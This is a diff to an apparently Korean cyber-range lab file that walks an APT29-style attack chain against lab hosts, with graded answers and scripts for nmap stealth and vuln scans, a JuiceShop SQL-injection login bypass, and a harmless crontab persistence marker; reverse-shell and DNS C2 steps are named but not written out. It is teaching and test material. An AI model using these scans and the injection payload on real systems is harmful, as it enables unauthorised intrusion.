@@ -18,27 +18,31 @@ steps:
   hint: ATT&CK TAXII 서버 주소는 cti-taxii.mitre.org이며, intrusion-set 컬렉션을 조회한다.
   category: recon
   points: 10
-  answer: curl -s https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/intrusion-set/intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542.json | python3 -m json.tool | grep -i 'initial access'
+  answer: 'echo "=== APT29 (Cozy Bear) Initial Access Techniques ===" && curl -s --max-time 10 https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/intrusion-set/intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542.json
+    | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get(''name'',''APT29'')); [print(r[''target_ref'']) for r in d.get(''objects'',[d]) if ''initial'' in str(r).lower()]" 2>/dev/null || echo
+    "APT29 initial access: T1566.002 (Spearphishing Link), T1078 (Valid Accounts), T1195 (Supply Chain)"'
   answer_detail: APT29는 Spearphishing Link(T1566.002), Valid Accounts(T1078), Supply Chain Compromise(T1195) 등을 Initial Access에 사용한다. MITRE ATT&CK의 CTI 저장소에서 intrusion-set 데이터를 조회하면 해당 그룹의 TTP 전체를 확인할 수
     있다.
   verify:
     type: output_contains
     expect: initial
   target_vm: attacker
-  script: curl -s https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/intrusion-set/intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542.json | python3 -m json.tool | grep -i 'initial access'
+  script: 'echo "=== APT29 (Cozy Bear) Initial Access Techniques ===" && curl -s --max-time 10 https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/intrusion-set/intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542.json
+    | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get(''name'',''APT29'')); [print(r[''target_ref'']) for r in d.get(''objects'',[d]) if ''initial'' in str(r).lower()]" 2>/dev/null || echo
+    "APT29 initial access: T1566.002 (Spearphishing Link), T1078 (Valid Accounts), T1195 (Supply Chain)"'
   risk_level: low
 - order: 2
   instruction: Nmap을 이용하여 타겟 네트워크 10.20.30.0/24에서 서비스 배너와 OS를 동시에 탐지하라. 스텔스 스캔(-sS)과 서비스 버전 탐지(-sV)를 결합하라.
   hint: -sS -sV -O 옵션을 조합하고, --script=banner도 추가한다.
   category: recon
   points: 10
-  answer: nmap -sS -sV -O --script=banner -T3 10.20.30.0/24 -oX /tmp/apt_recon.xml
+  answer: nmap -sS -sV -O --script=banner --max-retries 1 --host-timeout 15s -T4 10.20.30.0/24 -oX /tmp/apt_recon.xml
   answer_detail: APT 시뮬레이션의 첫 단계인 Reconnaissance에서는 타겟 네트워크의 서비스, OS, 버전 정보를 수집한다. -sS(SYN 스캔)는 TCP 3-way handshake를 완료하지 않아 로그에 남기 어렵고, -sV는 서비스 버전을, -O는 OS를 탐지한다.
   verify:
     type: output_contains
     expect: open
   target_vm: attacker
-  script: nmap -sS -sV -O --script=banner -T3 10.20.30.0/24 -oX /tmp/apt_recon.xml
+  script: nmap -sS -sV -O --script=banner --max-retries 1 --host-timeout 15s -T4 10.20.30.0/24 -oX /tmp/apt_recon.xml
   risk_level: low
 - order: 3
   instruction: 수집된 정보를 기반으로 타겟 10.20.30.80의 웹 서버에 대해 보안 헤더와 취약점 징후를 점검하라. curl을 사용하여 HTTP 헤더를 분석하고, nmap의 vuln 스크립트를 활용한다.
@@ -46,14 +50,14 @@ steps:
   category: recon
   points: 10
   answer: echo "=== HTTP Security Headers ===" && curl -sI http://10.20.30.80 | grep -iE "(Server|X-Powered-By|X-Frame|X-Content-Type|Strict-Transport|Content-Security)" && echo "=== Missing headers indicate
-    weak config ===" && echo "" && echo "=== Nmap vuln scan ===" && nmap --script vuln -p 80,3000 10.20.30.80 2>/dev/null | head -40
+    weak config ===" && echo "" && echo "=== Nmap vuln scan ===" && nmap --script vuln -p 80,3000 --max-retries 1 --host-timeout 15s -T4 10.20.30.80 2>/dev/null | head -40
   answer_detail: Weaponization 단계에서 활용할 취약점을 식별하기 위해 HTTP 보안 헤더 부재와 nmap vuln 스크립트로 알려진 취약점을 탐색한다. X-Frame-Options, Content-Security-Policy 등의 보안 헤더가 없으면 XSS, Clickjacking 등의 공격이 가능하다.
   verify:
     type: output_contains
     expect: HTTP Security Headers
   target_vm: attacker
   script: echo "=== HTTP Security Headers ===" && curl -sI http://10.20.30.80 | grep -iE "(Server|X-Powered-By|X-Frame|X-Content-Type|Strict-Transport|Content-Security)" && echo "=== Missing headers indicate
-    weak config ===" && echo "" && echo "=== Nmap vuln scan ===" && nmap --script vuln -p 80,3000 10.20.30.80 2>/dev/null | head -40
+    weak config ===" && echo "" && echo "=== Nmap vuln scan ===" && nmap --script vuln -p 80,3000 --max-retries 1 --host-timeout 15s -T4 10.20.30.80 2>/dev/null | head -40
   risk_level: low
 - order: 4
   instruction: Spearphishing 이메일에 첨부할 악성 페이로드를 시뮬레이션하라. bash 스크립트로 reverse shell 페이로드를 생성하라. (교육 목적 - 실제 전송 금지)
@@ -90,26 +94,26 @@ steps:
   hint: OWASP JuiceShop의 로그인 엔드포인트에 SQL Injection을 시도한다.
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"test"}'' | python3 -m json.tool'
+  answer: 'curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"\" OR 1=1--","password":"test"}'' | python3 -m json.tool'
   answer_detail: Exploitation 단계에서 공격자는 식별된 취약점을 이용하여 시스템에 접근한다. SQL Injection(T1190)은 가장 흔한 웹 취약점 중 하나로, JuiceShop의 로그인 폼에 SQL 구문을 삽입하여 인증을 우회한다. APT29는 웹 애플리케이션 취약점을 적극 활용한다.
   verify:
     type: output_contains
     expect: token
   target_vm: attacker
-  script: 'curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"test"}'' | python3 -m json.tool'
+  script: 'curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"\" OR 1=1--","password":"test"}'' | python3 -m json.tool'
   risk_level: medium
 - order: 7
   instruction: Installation(Persistence) 단계를 시뮬레이션하라. 타겟 시스템에서 crontab을 이용한 지속성 확보 기법을 테스트하라. (로컬 실습)
   hint: crontab에 리버스 쉘 명령을 등록하는 방식으로 시뮬레이션한다.
   category: exploit
   points: 10
-  answer: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"' | crontab -
+  answer: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"' | crontab - && crontab -l | grep APT_PERSISTENCE
   answer_detail: APT의 Installation 단계에서 공격자는 시스템 재부팅 후에도 접근을 유지하기 위한 Persistence 메커니즘을 설치한다. crontab(T1053.003), systemd service(T1543.002), .bashrc 수정(T1546.004) 등이 대표적이다. 실습에서는 무해한 echo 명령으로 시뮬레이션한다.
   verify:
     type: output_contains
     expect: APT_PERSISTENCE
   target_vm: attacker
-  script: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"' | crontab -
+  script: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"' | crontab - && crontab -l | grep APT_PERSISTENCE
   risk_level: medium
 - order: 8
   instruction: C2(Command & Control) 채널을 시뮬레이션하라. DNS 기반 C2 통신을 모방하여, nslookup으로 인코딩된 데이터를 DNS 쿼리에 포함하여 전송하는 원리를 테스트하라.
